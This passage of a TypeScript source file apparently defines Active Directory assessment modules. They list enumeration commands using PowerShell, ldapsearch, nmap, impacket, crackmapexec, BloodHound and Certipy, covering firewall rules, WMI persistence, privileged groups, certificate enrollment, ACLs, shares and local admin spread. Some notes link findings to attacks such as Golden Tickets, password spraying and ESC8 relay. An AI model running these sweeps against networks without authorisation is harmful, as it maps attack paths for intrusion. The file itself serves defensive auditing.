    description: 'Per-profile firewall state, inbound rule inventory, remote admin exceptions, WinRM/RDP rules, and firewall policy GPO assignments.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'firewall-state', name: 'Firewall state and profiles',
        description: 'Profile-level firewall configuration.',
        commands: [
          { id: 'fw-get-profile', title: 'Get firewall profiles', command: 'Get-NetFirewallProfile | Select-Object Name,Enabled,DefaultInboundAction,DefaultOutboundAction,LogAllowed,LogBlocked', notes: 'Domain, Private, Public profile firewall state.' },
          { id: 'fw-get-rules-inbound', title: 'List inbound allow rules', command: 'Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True | Select-Object DisplayName,Profile,Direction,Action | Sort-Object DisplayName', notes: 'All active inbound exceptions.' },
          { id: 'fw-remote-admin', title: 'Check remote admin exception', command: 'Get-NetFirewallRule -DisplayGroup "Windows Remote Management" | Select-Object DisplayName,Enabled,Profile', notes: 'WinRM firewall rules — lateral movement vector.' },
          { id: 'fw-rdp-rule', title: 'Check RDP firewall rule', command: 'Get-NetFirewallRule -DisplayName "Remote Desktop*" | Select-Object DisplayName,Enabled,Profile,Direction,Action', notes: 'RDP exposure via firewall rules.' },
          { id: 'fw-any-any', title: 'Find overly permissive rules', command: 'Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True | Where-Object { $_ | Get-NetFirewallAddressFilter | Where-Object {$_.RemoteAddress -eq "Any"} } | Select-Object DisplayName,Profile', notes: 'Inbound rules with no source restriction.' },
          { id: 'fw-gpo-policy', title: 'Check firewall GPO policy', command: 'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall"', notes: 'GPO-enforced firewall settings.' },
        ],
      },
      {
        id: 'firewall-linux', name: 'Linux firewall checks',
        description: 'Remote firewall assessment from Linux.',
        commands: [
          { id: 'fw-nmap-state', title: 'Port state check (nmap)', command: 'nmap -Pn -p 3389,5985,5986,445,139,22 <IP>', notes: 'Open/filtered/closed port states.' },
          { id: 'fw-nmap-scripts', title: 'Firewall bypass detection (nmap)', command: 'nmap -sA -p 80,443,445 <IP>', notes: 'ACK scan — filtered vs unfiltered distinction.' },
        ],
      },
    ],
    excluded_capabilities: ['firewall rule modification', 'bypass techniques'],
  },
  {
    id: 'wmi_exposure',
    name: 'WMI and DCOM Exposure',
    category: 'infrastructure',
    description: 'WMI service state, DCOM application permissions, remote WMI access, WMI subscriptions (backdoor check), DCOM AppID ACLs, and lateral movement surface via COM.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'wmi-state', name: 'WMI and DCOM service state',
        description: 'WMI and DCOM configuration checks.',
        commands: [
          { id: 'wmi-service', title: 'Check WMI service', command: 'Get-Service winmgmt | Select-Object Name,Status,StartType', notes: 'WMI service state — required for remote WMI execution.' },
          { id: 'wmi-firewall', title: 'Check WMI firewall rules', command: 'Get-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" | Select-Object DisplayName,Enabled,Profile', notes: 'WMI inbound rules — lateral movement surface.' },
          { id: 'wmi-subscriptions', title: 'List WMI event subscriptions', command: 'Get-WMIObject -Namespace root\\subscription -Class __EventConsumer | Select-Object Name,CommandLineTemplate,ScriptText', notes: 'WMI event subscriptions — common persistence mechanism.' },
          { id: 'wmi-subscriptions-filter', title: 'List WMI event filters', command: 'Get-WMIObject -Namespace root\\subscription -Class __EventFilter | Select-Object Name,Query,QueryLanguage', notes: 'WMI filters paired with consumers for persistence.' },
          { id: 'wmi-subscriptions-binding', title: 'List WMI filter-to-consumer bindings', command: 'Get-WMIObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Select-Object Filter,Consumer', notes: 'Active WMI persistence bindings.' },
          { id: 'dcom-list-apps', title: 'List DCOM applications', command: 'Get-CimInstance -ClassName Win32_DCOMApplication | Select-Object AppID,Name | Sort-Object Name', notes: 'DCOM app inventory for lateral movement mapping.' },
        ],
      },
      {
        id: 'wmi-remote', name: 'Remote WMI checks',
        description: 'WMI access validation.',
        commands: [
          { id: 'wmi-remote-os', title: 'Test remote WMI (OS class)', command: 'Get-CimInstance -ComputerName <hostname> -ClassName Win32_OperatingSystem', notes: 'Remote WMI connectivity test.' },
          { id: 'wmi-nmap', title: 'Check WMI port via nmap', command: 'nmap -p 135 --script msrpc-enum <IP>', notes: 'RPC/DCOM service enumeration including WMI.' },
        ],
      },
    ],
    excluded_capabilities: ['WMI execution', 'DCOM exploitation', 'WMI subscription deployment'],
  },
  {
    id: 'privileged_group_nesting',
    name: 'Privileged Group Nesting Analysis',
    category: 'authorization',
    description: 'Nested group membership resolution, shadow principals, unexpected foreign group nesting, recursive membership in privileged groups, and group scope analysis.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'nesting-windows', name: 'Windows group nesting analysis',
        description: 'Recursive group membership and nesting visibility.',
        commands: [
          { id: 'nest-da-recursive', title: 'Recursive Domain Admins members', command: 'Get-ADGroupMember "Domain Admins" -Recursive | Select-Object Name,SamAccountName,ObjectClass,DistinguishedName', notes: 'Full membership including via nested groups.' },
          { id: 'nest-ea-recursive', title: 'Recursive Enterprise Admins members', command: 'Get-ADGroupMember "Enterprise Admins" -Recursive | Select-Object Name,SamAccountName,ObjectClass,DistinguishedName', notes: 'All EA members including nested.' },
          { id: 'nest-depth-check', title: 'Find deeply nested groups', command: 'function Get-NestedDepth($group,$depth=0){$members=Get-ADGroupMember $group -ErrorAction SilentlyContinue; foreach($m in $members){if($m.objectClass -eq "group"){Write-Host ("  "*($depth+1)+"$($m.Name) [depth $($depth+1)]"); Get-NestedDepth $m.Name ($depth+1)}}}; Get-NestedDepth "Domain Admins"', notes: 'Visualizes DA group nesting depth.' },
          { id: 'nest-cross-domain', title: 'Find cross-domain nested groups', command: 'Get-ADGroup -Filter * | ForEach-Object { Get-ADGroupMember $_ | Where-Object {$_.distinguishedName -notmatch (Get-ADDomain).DistinguishedName} | Select-Object @{N="Group";E={$_.Name}},Name,DistinguishedName }', notes: 'Groups with members from other domains.' },
          { id: 'nest-foreign-members', title: 'Find foreign member principals', command: "Get-ADGroup -Filter * | ForEach-Object { $g=$_.Name; Get-ADGroupMember $_ -ErrorAction SilentlyContinue | Where-Object {$_.objectClass -eq 'foreignSecurityPrincipal'} | Select-Object @{N='Group';E={$g}},Name,DistinguishedName }", notes: 'Groups containing cross-domain or foreign SID members.' },
          { id: 'nest-all-priv-recursive', title: 'All privileged group members (recursive)', command: '@("Domain Admins","Administrators","Schema Admins","Enterprise Admins","Group Policy Creator Owners","DnsAdmins","Account Operators","Backup Operators") | ForEach-Object { $g=$_; Get-ADGroupMember $g -Recursive -ErrorAction SilentlyContinue | Select-Object @{N="Group";E={$g}},Name,SamAccountName,ObjectClass } | Sort-Object Group', notes: 'One-pass recursive inventory of all sensitive groups.' },
        ],
      },
      {
        id: 'nesting-ldap', name: 'LDAP nesting queries',
        description: 'Cross-platform nested group discovery.',
        commands: [
          { id: 'nest-ldap-member-of', title: 'Find group members with sensitive roles', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(memberOf:1.2.840.113556.1.4.1941:=cn=domain admins,cn=users,dc=corp,dc=com)" sAMAccountName distinguishedName memberOf', notes: 'Recursive LDAP_MATCHING_RULE_IN_CHAIN for DA membership.' },
          { id: 'nest-ldap-da-chain', title: 'Find all indirect DA members', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=com)" cn sAMAccountName objectClass', notes: 'OID 1.2.840.113556.1.4.1941 = LDAP_MATCHING_RULE_IN_CHAIN (recursive).' },
        ],
      },
    ],
    excluded_capabilities: ['group membership modification'],
  },
  {
    id: 'cert_enrollment',
    name: 'Certificate Enrollment Analysis',
    category: 'certificate-services',
    description: 'Enrollment endpoint URLs, web enrollment (CES/CEP), autoenrollment policy, certificate request audit trail, issued certificate inventory, and NDES/SCEP exposure.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'cert-enrollment-windows', name: 'Windows enrollment analysis',
        description: 'Enrollment endpoint and policy visibility.',
        commands: [
          { id: 'cert-autoenroll-policy', title: 'Check autoenrollment policy', command: 'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Cryptography\\AutoEnrollment" /v AEPolicy', notes: '7 = request, enroll, and renew pending certs. 0/absent = disabled.' },
          { id: 'cert-issued-certs', title: 'List issued certificates', command: 'certutil -view -restrict "GeneralFlags>0" -out SerialNumber,CommonName,NotBefore,NotAfter,RequesterName,CertificateTemplate', notes: 'Issued certificate inventory — run on CA.' },
          { id: 'cert-crl-config', title: 'Check CRL distribution points', command: 'certutil -getreg ca\\CRLPublicationURLs', notes: 'CRL distribution paths — stale CRL can break revocation checking.' },
          { id: 'cert-web-enrollment', title: 'Check Web Enrollment service', command: 'Get-WindowsFeature ADCS-Web-Enrollment | Select-Object Name,Installed', notes: 'Web enrollment = ESC8 HTTP relay target when HTTP (not HTTPS) only.' },
          { id: 'cert-ndes', title: 'Check NDES role state', command: 'Get-WindowsFeature ADCS-Device-Enrollment | Select-Object Name,Installed', notes: 'NDES/SCEP = certificate enrollment for network devices.' },
        ],
      },
      {
        id: 'cert-enrollment-ldap', name: 'LDAP enrollment analysis',
        description: 'Cross-platform enrollment surface discovery.',
        commands: [
          { id: 'cert-ldap-ndes', title: 'Find NDES enrollment objects (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=configuration,dc=corp,dc=com" "(objectClass=msPKI-PrivateKeyRecoveryAgent)" cn dNSHostName', notes: 'NDES service object discovery.' },
          { id: 'cert-ldap-cep', title: 'Find CEP/CES endpoints (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=configuration,dc=corp,dc=com" "(|(objectClass=msPKI-CEPEncryption)(objectClass=msPKI-EnrollmentServer))" cn msPKI-EnrollmentServers', notes: 'Certificate Enrollment Policy and Service endpoints.' },
          { id: 'cert-nmap-http', title: 'Probe CA HTTP endpoints', command: 'nmap -sV -p 80,443 --script http-title,ssl-cert <CA_IP>', notes: 'Discovers web enrollment, CES, CEP, and NDES URLs.' },
          { id: 'cert-certipy-find-all', title: 'Full certificate surface (Certipy)', command: 'certipy find -u <user>@<domain> -p <pass> -dc-ip <IP> -old-bloodhound', notes: 'Comprehensive ADCS surface including enrollment endpoints and template analysis.' },
          { id: 'cert-curl-certsrv', title: 'Test web enrollment HTTP access', command: 'curl -sk http://<CA_IP>/certsrv/ -I', notes: 'HTTP response from web enrollment — 401/200 indicates active service.' },
        ],
      },
    ],
    excluded_capabilities: ['unauthorized certificate request', 'ESC exploitation'],
  },
  {
    id: 'domain_policy_deep',
    name: 'Domain Policy Deep Dive',
    category: 'policy',
    description: 'Default Domain Policy audit, account lockout, Kerberos policy, password complexity, reversible encryption, and Fine-Grained Password Policy intersection.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'domainpol-windows', name: 'Windows domain policy analysis',
        description: 'Comprehensive domain-level policy review.',
        commands: [
          { id: 'domainpol-full', title: 'Read full default domain policy', command: 'Get-ADDefaultDomainPasswordPolicy', notes: 'Password length, complexity, history, lockout, and Kerberos policy.' },
          { id: 'domainpol-complexity', title: 'Check password complexity', command: 'Get-ADDefaultDomainPasswordPolicy | Select-Object ComplexityEnabled,MinPasswordLength,PasswordHistoryCount,MaxPasswordAge,MinPasswordAge', notes: 'Core complexity and aging settings.' },
          { id: 'domainpol-lockout', title: 'Check account lockout', command: 'Get-ADDefaultDomainPasswordPolicy | Select-Object LockoutThreshold,LockoutDuration,LockoutObservationWindow', notes: 'LockoutThreshold=0 = infinite spray window.' },
          { id: 'domainpol-gpo-report', title: 'Export Default Domain Policy report', command: 'Get-GPOReport -Name "Default Domain Policy" -ReportType Html -Path "C:\\Temp\\DDP.html"', notes: 'Full HTML policy report for review.' },
          { id: 'domainpol-gpresult', title: 'Get effective domain policy (gpresult)', command: 'gpresult /r /z', notes: 'Effective applied policies for the current machine/user.' },
          { id: 'domainpol-secedit', title: 'Export local security policy', command: 'secedit /export /cfg C:\\Temp\\secpol.cfg', notes: 'Local security policy export for comparison against GPO.' },
          { id: 'domainpol-kerberos-gpo', title: 'Find Kerberos policy GPO setting', command: 'Get-GPO "Default Domain Policy" | Get-GPOReport -ReportType Xml | Select-Xml -XPath "//Kerberos"', notes: 'Kerberos settings within the Default Domain Policy GPO.' },
        ],
      },
      {
        id: 'domainpol-ldap', name: 'LDAP domain policy queries',
        description: 'Cross-platform policy discovery.',
        commands: [
          { id: 'domainpol-ldap-full', title: 'Read domain policy attributes (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(objectClass=domain)" minPwdLength maxPwdAge minPwdAge pwdHistoryLength pwdProperties lockoutThreshold lockoutDuration lockOutObservationWindow ms-DS-MachineAccountQuota', notes: 'All domain-level password and lockout policy attributes.' },
          { id: 'domainpol-ldap-reversible', title: 'Check reversible encryption policy', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(objectClass=domain)" pwdProperties', notes: 'pwdProperties & 16 = DOMAIN_PASSWORD_STORE_CLEARTEXT.' },
        ],
      },
    ],
    excluded_capabilities: ['policy modification'],
  },
  {
    id: 'security_desc',
    name: 'Security Descriptor Deep Analysis',
    category: 'authorization',
    description: 'nTSecurityDescriptor analysis for critical objects, Owner identification, SACL audit entries, AdminSDHolder propagation, and object-level permission comparison.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'secdesc-windows', name: 'Windows security descriptor analysis',
        description: 'ACL and ownership analysis on AD objects.',
        commands: [
          { id: 'secdesc-krbtgt', title: 'Read krbtgt security descriptor', command: "Get-Acl 'AD:\\$(Get-ADUser krbtgt | Select-Object -ExpandProperty DistinguishedName)' | Format-List", notes: 'krbtgt ACL — write access = Golden Ticket via password reset.' },
          { id: 'secdesc-schema', title: 'Read schema container ACL', command: "Get-Acl 'AD:\\CN=Schema,CN=Configuration,DC=corp,DC=com' | Format-List", notes: 'Schema write = forest-wide impact.' },
          { id: 'secdesc-config', title: 'Read configuration partition ACL', command: "Get-Acl 'AD:\\CN=Configuration,DC=corp,DC=com' | Format-List", notes: 'Configuration partition write = service and PKI modification.' },
          { id: 'secdesc-gpc-acl', title: 'Review GPO container ACL', command: "Get-Acl 'AD:\\CN=Policies,CN=System,DC=corp,DC=com' | Format-List", notes: 'Policy container write = GPO creation rights.' },
          { id: 'secdesc-non-default-owners', title: 'Find non-default object owners', command: "Get-ADObject -SearchBase 'DC=corp,DC=com' -Filter {adminCount -eq 1} | ForEach-Object { $acl=Get-Acl \"AD:\\$($_.DistinguishedName)\"; if ($acl.Owner -notmatch 'Domain Admins|Administrators|SYSTEM') { [PSCustomObject]@{Object=$_.Name;Owner=$acl.Owner} } }", notes: 'Protected objects with non-default owners.' },
          { id: 'secdesc-all-extended', title: 'Find accounts with AllExtendedRights', command: "Get-ADUser -Filter * | ForEach-Object { (Get-Acl 'AD:\\$($_.DistinguishedName)').Access | Where-Object {$_.ActiveDirectoryRights -match 'ExtendedRight' -and $_.ObjectType -eq '00000000-0000-0000-0000-000000000000'} | Select-Object IdentityReference }", notes: 'AllExtendedRights = any extended right including force password change.' },
        ],
      },
      {
        id: 'secdesc-ldap', name: 'LDAP security descriptor queries',
        description: 'Cross-platform security descriptor reads.',
        commands: [
          { id: 'secdesc-ldap-dacl', title: 'Dump nTSecurityDescriptor (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(distinguishedName=<DN>)" nTSecurityDescriptor', notes: 'Raw SD attribute — post-process with ldap_parse_security_descriptor.' },
          { id: 'secdesc-impacket-read', title: 'Read object ACEs (impacket)', command: 'impacket-dacledit <domain>/<user>:<pass>@<IP> -action read -target-dn "<DN>"', notes: 'Parsed DACL output for a target DN.' },
          { id: 'secdesc-bloodhound', title: 'Collect ACLs (BloodHound)', command: 'bloodhound-python -d <domain> -u <user> -p <pass> -dc <DC> -c ACL --zip', notes: 'Graph-ready ACL collection for path analysis.' },
          { id: 'secdesc-ldap-owner', title: 'Read object owner (impacket)', command: 'impacket-owneredit <domain>/<user>:<pass>@<IP> -action read -target <SamAccountName>', notes: 'Current owner of a target object.' },
        ],
      },
    ],
    excluded_capabilities: ['ACL modification', 'owner change', 'DACL write'],
  },
  {
    id: 'network_share_deep',
    name: 'Network Share Deep Enumeration',
    category: 'infrastructure',
    description: 'SYSVOL, NETLOGON, IPC$, and custom share enumeration, DFS namespace discovery, share ACLs, anonymous/guest access, and content-level sensitive data discovery.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'share-windows', name: 'Windows share enumeration',
        description: 'Share and DFS discovery from Windows.',
        commands: [
          { id: 'share-list-all', title: 'List all local shares', command: 'Get-SmbShare | Select-Object Name,Path,ShareType,Description', notes: 'Local share inventory.' },
          { id: 'share-acls', title: 'Review share ACLs', command: 'Get-SmbShareAccess | Select-Object Name,AccountName,AccessRight | Sort-Object Name', notes: 'Share-level access control.' },
          { id: 'share-open-access', title: 'Find shares with Everyone access', command: 'Get-SmbShareAccess | Where-Object {$_.AccountName -match "Everyone|Authenticated Users|Domain Users"} | Select-Object Name,AccountName,AccessRight', notes: 'Broadly accessible shares.' },
          { id: 'share-dfs-namespace', title: 'Enumerate DFS namespaces', command: 'Get-DfsnRoot | Select-Object Path,Type,State', notes: 'DFS namespace roots and their paths.' },
          { id: 'share-dfs-folders', title: 'List DFS folders', command: 'Get-DfsnFolder -Path \\\\<domain>\\<namespace>\\* | Select-Object Path,State,Description', notes: 'DFS folder structure.' },
        ],
      },
      {
        id: 'share-linux', name: 'Linux share enumeration',
        description: 'Remote share discovery and content analysis.',
        commands: [
          { id: 'share-smbmap', title: 'Map all shares (smbmap)', command: 'smbmap -H <IP> -u <user> -p <pass> -d <domain> -R', notes: 'Recursive share access and content listing.' },
          { id: 'share-spider', title: 'Spider shares for sensitive content', command: 'crackmapexec smb <IP> -u <user> -p <pass> -M spider_plus --share <share>', notes: 'Indexes share content for offline sensitive-file discovery.' },
          { id: 'share-impacket-list', title: 'List shares (impacket)', command: 'impacket-smbclient <domain>/<user>:<pass>@<IP> -c "shares"', notes: 'Quick share listing via impacket.' },
          { id: 'share-null-session', title: 'Test null session access', command: "impacket-smbclient ''@<IP> -c 'shares' 2>/dev/null", notes: 'Unauthenticated share listing test.' },
          { id: 'share-nmap-enum', title: 'Enumerate shares (nmap NSE)', command: 'nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=<user>,smbpassword=<pass> <IP>', notes: 'NSE-based share enumeration with content listing.' },
        ],
      },
    ],
    excluded_capabilities: ['share content extraction without authorization', 'guest access exploitation'],
  },
  {
    id: 'local_admin_spread',
    name: 'Local Admin Spread Analysis',
    category: 'host-access',
    description: 'Domain users with local admin rights, excessive local admin permissions, local admin group members across hosts, and lateral movement via local admin paths.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'localadmin-windows', name: 'Windows local admin analysis',
        description: 'Local admin visibility across the domain.',
        commands: [
          { id: 'ladmin-current', title: 'List current host local admins', command: 'Get-LocalGroupMember Administrators | Select-Object Name,ObjectClass,PrincipalSource', notes: 'Local admin members on the current host.' },
          { id: 'ladmin-powerview-find', title: 'Find local admins via PowerView', command: 'Find-LocalAdminAccess', notes: 'Tests current user local admin access across domain computers — can be noisy.' },
          { id: 'ladmin-invoke-admin', title: 'Enumerate local admins on all DCs', command: 'Get-ADDomainController -Filter * | ForEach-Object { Invoke-Command -ComputerName $_.Name -ScriptBlock { Get-LocalGroupMember Administrators } -ErrorAction SilentlyContinue }', notes: 'DC local admin inventory.' },
          { id: 'ladmin-net-check', title: 'Check net localgroup (Windows)', command: 'net localgroup administrators', notes: 'Quick local admin enumeration.' },
        ],
      },
      {
        id: 'localadmin-linux', name: 'Linux local admin discovery',
        description: 'Remote local admin enumeration.',
        commands: [
          { id: 'ladmin-cme-sweep', title: 'Local admin sweep (CME)', command: 'crackmapexec smb <IP/CIDR> -u <user> -p <pass> --local-auth', notes: 'Tests local admin with target credentials across subnet.' },
          { id: 'ladmin-nmap-smb', title: 'Enumerate local admins (nmap NSE)', command: 'nmap -p445 --script smb-enum-users --script-args smbusername=<user>,smbpassword=<pass> <IP>', notes: 'SMB-based user enumeration on target host.' },
          { id: 'ladmin-bloodhound-session', title: 'Collect session and local admin (BloodHound)', command: 'bloodhound-python -d <domain> -u <user> -p <pass> -dc <DC> -c LocalAdmin,Session', notes: 'Graph-based local admin edge collection.' },
          { id: 'ladmin-impacket-reg', title: 'Remote registry local admin check', command: 'impacket-reg <domain>/<user>:<pass>@<IP> query -keyName "HKLM\\SAM\\SAM\\Domains\\Builtin\\Aliases\\Names\\Administrators"', notes: 'Remote registry probe for local Administrators group.' },
        ],
      },
    ],
    excluded_capabilities: ['local admin exploitation', 'pass-the-hash'],
  },
  {
    id: 'site_topology',
    name: 'Site Link and Replication Costs',
    category: 'topology',
    description: 'AD site inventory, site links and costs, subnet assignments, bridgehead servers, replication schedule, and site-based attack surface mapping.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'site-windows', name: 'Windows site topology',
        description: 'Comprehensive site and link analysis.',
        commands: [
          { id: 'site-all', title: 'List all AD sites', command: 'Get-ADReplicationSite -Filter * | Select-Object Name,Description,DistinguishedName', notes: 'All site objects.' },
          { id: 'site-links', title: 'List site links', command: 'Get-ADReplicationSiteLink -Filter * | Select-Object Name,Cost,ReplicationFrequencyInMinutes,SitesIncluded', notes: 'Site link cost and frequency — low cost = preferred replication path.' },
          { id: 'site-subnets', title: 'List site subnets', command: 'Get-ADReplicationSubnet -Filter * | Select-Object Name,Site,Location', notes: 'Subnet to site mapping — gaps mean hosts may not find correct DC.' },
          { id: 'site-dc-per-site', title: 'DCs per site', command: 'Get-ADDomainController -Filter * | Group-Object Site | Select-Object Name,Count | Sort-Object Count -Descending', notes: 'DC distribution across sites.' },
          { id: 'site-bridgehead', title: 'Find bridgehead servers', command: 'Get-ADObject -SearchBase "CN=Sites,CN=Configuration,DC=corp,DC=com" -Filter {objectClass -eq "nTDSConnection"} -Properties fromServer,enabledConnection | Select-Object Name,fromServer,enabledConnection', notes: 'ISTG bridgehead servers for inter-site replication.' },
          { id: 'site-coverage', title: 'Check site coverage gaps', command: 'Get-ADReplicationSubnet -Filter * | Where-Object {-not $_.Site} | Select-Object Name', notes: 'Subnets with no site assignment — clients fall to default-first-site-name DC.' },
        ],
      },
      {
        id: 'site-ldap', name: 'LDAP site topology',
        description: 'Cross-platform site discovery.',
        commands: [
          { id: 'site-ldap-all', title: 'Enumerate sites (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=sites,cn=configuration,dc=corp,dc=com" "(objectClass=site)" cn description', notes: 'All site objects via LDAP.' },
          { id: 'site-ldap-links', title: 'Enumerate site links (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=inter-site transports,cn=sites,cn=configuration,dc=corp,dc=com" "(objectClass=siteLink)" cn cost replInterval siteList', notes: 'Site link cost and schedule.' },
          { id: 'site-ldap-subnets', title: 'Enumerate subnets (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=subnets,cn=sites,cn=configuration,dc=corp,dc=com" "(objectClass=subnet)" cn siteObject location', notes: 'All subnet to site mappings.' },
          { id: 'site-ldap-sitelink-bridge', title: 'Find site link bridges', command: 'ldapsearch -x -H ldap://<IP> -b "cn=inter-site transports,cn=sites,cn=configuration,dc=corp,dc=com" "(objectClass=siteLinkBridge)" cn siteLinkList', notes: 'Site link bridge objects.' },
        ],
      },
    ],
    excluded_capabilities: ['replication abuse', 'site link modification'],
  },
]

fallbackCollectionModules.push(...expandedCollectionModules)
fallbackCollectionModules.push(...exposureQuickCheckModules.filter(module => !fallbackCollectionModules.some(existing => existing.id === module.id)))
fallbackCollectionModules.push(...architectureAttackModules.filter(module => !fallbackCollectionModules.some(existing => existing.id === module.id)))
fallbackCollectionModules.push(...megaExpansionModules.filter(module => !fallbackCollectionModules.some(existing => existing.id === module.id)))

export const collectionModuleMeta = Object.fromEntries(
  fallbackCollectionModules.map((module, index) => [
    module.id,
    {
      label: module.name,
      accent: ['#22d3ee', '#818cf8', '#a78bfa', '#f472b6', '#38bdf8', '#f59e0b', '#34d399', '#f97316', '#fb7185', '#14b8a6', '#94a3b8'][index % 11],
    },
  ])
) as Record<string, { label: string; accent: string }>

export const defaultCollectionModuleIds = fallbackCollectionModules.map((module) => module.id)
